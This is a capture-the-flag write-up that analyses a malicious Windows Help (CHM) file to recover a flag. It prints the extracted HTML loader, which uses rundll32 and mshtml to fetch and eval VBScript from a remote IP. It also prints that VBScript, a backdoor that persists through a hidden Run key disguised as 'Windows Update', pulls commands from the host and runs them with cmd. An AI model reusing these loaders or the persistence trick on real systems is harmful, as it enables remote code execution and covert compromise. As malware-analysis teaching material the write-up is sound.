# CHM

> **Challenge Description:** Help me with this Windows Help file. Our anti-virus has detected this file as a malware. Seriously, it's just a Windows Help file. Analyze and find the flag.
>
> **Flag Format:** `ihack{MD5}`

### Solution

CHM files can be opened and extracted using `hh.exe` in Windows for legitimate use. In this case, extract all the components from the CHM file using `7z`.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/CHM]
â””â”€$ 7z e chm.chm 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10781 bytes (11 KiB)

Extracting archive: chm.chm
--
Path = chm.chm
Type = Chm
Physical Size = 10781

Would you like to replace the existing file:
  Path:     ./Property
  Size:     4 bytes (1 KiB)
  Modified: 2022-12-01 00:52:05
with the file from archive:
  Path:     $WWAssociativeLinks/Property
  Size:     4 bytes (1 KiB)
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? u

Everything is Ok                     

Folders: 2
Files: 12
Size:       11892
Compressed: 10781
```

The extracted `version.html` contains a embedded payload that references a `.vbs` file from a remote URL.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/CHM]
â””â”€$ cat version.html                                               
<body>
    <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
        <PARAM name="Command" value="ShortCut">
        <PARAM name="Button" value="Bitmap::shortcut">
        <PARAM name="Item1" value=',cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe > nul && %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://139.59.122.20/version.vbs",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}'>
        <PARAM name="Item2" value="273,1,1">
      </OBJECT>
      <SCRIPT>
        x.Click();
      </SCRIPT> 
</body>
</html>  
```

Continue analyzing `version.vbs` to retrieve the 2nd portion of the flag. Also, notice that `version.txt` is fetched remotely.

```
Option Explicit
On Error Resume Next
Const tail = "7866c99c63a26b4886"
Const test = "122.20/"
Set oFileSystem = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
Const close = "}"
Const versionfile = "version.txt"
app_data = WshShell.ExpandEnvironmentStrings("%APPDATA%")
full_install = app_data & "\ihack.vbs"
If Not oFileSystem.FileExists(full_install) Then
        oFileSystem.CopyFile WScript.ScriptFullName, full_install
        WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update", full_install, "REG_SZ"
        Set rs_map = oFileSystem.GetFile(full_install)
        rs_map.Attributes = 2
End If
Const server = "http://139.59." & test & versionfile
done = False
Do Until done
        Set XMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")
        XMLHTTP.open "GET", server, False
        XMLHTTP.send
        command = XMLHTTP.responseText
        WshShell.Run "cmd /c " & command, 0, True
        MsgBox("Your computer has been compromised by iHack team. You can exit this msgbox in your Task Manager.")
        If InStr(command, "iha") Then
                dim sec = command & tail & close
        Else InStr(command, "EXIT") Then
                done = True
        End If
        If InStr(command, "REMOVE") Then
                WshShell.RegDelete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update"
                Set delete_me = oFileSystem.CreateTextFile(oFileSystem.GetSpecialFolder(2) & "\romcs.bat")
                delete_me.WriteLine("@echo off")
                delete_me.WriteLine("timeout 10")
                delete_me.Close()
                WshShell.Run oFileSystem.GetSpecialFolder(2) & "\romcs.bat"
                done = True
        Else
                WshShell.Run "cmd /c " & command, 0, True
        End If
        WScript.Sleep(15000)
Loop
```

`version.txt` contains the first portion of the flag.

```
ipconfig
net user
arp -a
net localgroup administrators
ihack{6e5e4d1b1805aa
```

**Flag:** `ihack{6e5e4d1b1805aa7866c99c63a26b4886}`
